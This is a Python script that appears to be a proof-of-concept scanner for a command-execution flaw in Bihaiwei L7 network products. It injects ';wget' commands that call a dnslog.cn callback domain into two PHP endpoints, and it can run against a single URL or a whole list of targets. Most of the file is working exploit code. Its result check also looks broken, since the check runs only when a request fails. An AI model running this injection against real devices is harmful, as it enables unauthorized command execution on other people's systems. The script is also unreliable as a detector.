#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import argparse
import random
import time
import string
from urllib3.exceptions import InsecureRequestWarning

RED = '\033[91m'
RESET = '\033[0m'
# 忽略证书验证警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def rand_base(n):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'
}

def get_dnslog():
    url = f'http://www.dnslog.cn/getdomain.php?t={random.random()}'
    r = requests.get(url=url, headers=headers, timeout=18)
    get_cookie = r.cookies.get_dict()
    cookie = "; ".join([f"{k}={v}" for k, v in get_cookie.items()])
    info = {'domain': r.text.strip(), 'cookie': cookie}
    return info

def check_dnslog(info):
    cookie = info['cookie']
    domain = info['domain']
    url = f'http://www.dnslog.cn/getrecords.php?t={random.random()}'
    headers.update({'Cookie': cookie})
    r = requests.get(url=url, headers=headers, timeout=18)
    get_log_text = r.text
    if domain in get_log_text:
        return True
    else:
        return False

def check_vulnerability(url):
    identification1 = rand_base(4)
    identification2 = rand_base(4)
    dnsloginfo = get_dnslog()
    dnslog = dnsloginfo['domain']
    try:
        # 构造完整的攻击URL
        attack_url = f"{url.rstrip('/')}/notice/confirm.php?t=;wget%20{identification1}.{dnslog}"
        response = requests.get(attack_url, verify=False, timeout=10)
        attack_url2 = f"{url.rstrip('/')}/notice/jumper.php?t=;wget%20{identification2}.{dnslog}"
        response2 = requests.get(attack_url2, verify=False, timeout=10)
    except requests.RequestException as e:
        if check_dnslog(dnsloginfo):
            print(f"{RED}URL [{url}] 可能存在碧海威 L7多款网络产品存在命令执行漏洞；{RESET}")
        else:
            print(f"URL [{url}] 可能不存在漏洞；")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在碧海威 L7多款网络产品存在命令执行漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_vulnerability(url)

if __name__ == '__main__':
    main()
